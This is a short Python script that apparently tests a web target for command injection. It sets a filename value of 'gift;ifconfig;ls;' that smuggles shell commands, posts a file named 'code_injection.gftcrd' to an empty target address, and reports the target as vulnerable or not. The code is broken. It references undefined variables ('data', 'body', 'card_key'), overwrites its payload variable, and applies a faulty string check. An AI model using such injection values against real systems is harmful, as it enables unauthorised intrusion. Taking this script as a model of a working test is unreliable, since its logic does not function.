import requests
inflitration = ''
init_session = requests.Session()
file = "gift;ifconfig;ls;"
try: 
    with open('code_injection.gftcrd') as file:
        init_session.post(inflitration, data, file)
        if body.text.find(card_key):
            print("Vulnerable to command injection")
        else:
            print("Not vulnerable to command injection")
except:
    print("Not vulnerable to command injection")

